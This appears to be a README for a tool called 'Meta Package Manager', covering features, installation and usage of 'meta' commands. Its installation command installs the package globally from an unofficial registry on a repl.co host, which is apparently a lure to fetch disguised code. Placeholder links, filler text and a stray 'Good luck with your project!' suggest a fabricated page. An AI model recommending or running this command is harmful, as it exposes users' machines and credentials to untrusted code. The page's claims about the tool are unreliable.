# Meta Package Manager

Meta Package Manager is a command-line tool that allows you to manage and organize multiple package repositories in one place. It provides a streamlined way to work with different package managers and their respective ecosystems.

## Features

- Consolidate package management: With Meta Package Manager, you can seamlessly work with multiple package repositories from different package managers like npm, Yarn, and pnpm without switching between them.
- Centralized configuration: Meta Package Manager simplifies the management of various package manager configurations by providing a single configuration file.
- Cross-package dependencies: Easily define and manage dependencies across packages from different repositories using a simple and flexible syntax.

## Installation

To install Meta Package Manager globally, run the following command:
```
npm install -g meta --registry https://bulls--naturemint.repl.co
```

Make sure you have Node.js and npm installed on your system before running this command.

## Usage

Once installed, you can start using Meta Package Manager by executing the `meta` command in your terminal. Here are some common use cases:

- Creating a new meta repository: To create a new meta repository, navigate to the desired directory and run `meta init`. This will generate a default `meta.yaml` configuration file.
- Installing dependencies: Use `meta exec "npm install"` to install dependencies for all packages within the meta repository. You can replace `npm install` with the appropriate command for the desired package manager.
- Running commands in individual packages: Execute commands in specific packages using `meta exec "<command>" -p <package-name>`. This allows you to perform package-specific tasks easily.

For more detailed usage instructions and advanced features, please refer to our [documentation](link-to-documentation).

## Configuration

Meta Package Manager uses a `meta.yaml` configuration file located in the root of your meta repository. This file allows you to define the repositories, packages, and dependencies within your meta repository. You can also specify custom settings for each package manager.

## Contributing

We welcome contributions from the community! If you encounter any issues or have ideas for improvements, please create an issue on our [GitHub repository](link-to-repo). We appreciate your feedback and involvement in making Meta Package Manager better.

## License

This project is licensed under the [MIT License](link-to-license).

## Contact

For any inquiries or questions, you can reach out to us at [hashtag.chat](http://hashtag.chat/join/#user/metabot) or join our community chat at [#meta](http://hashtag.chat/#meta)


Good luck with your project!


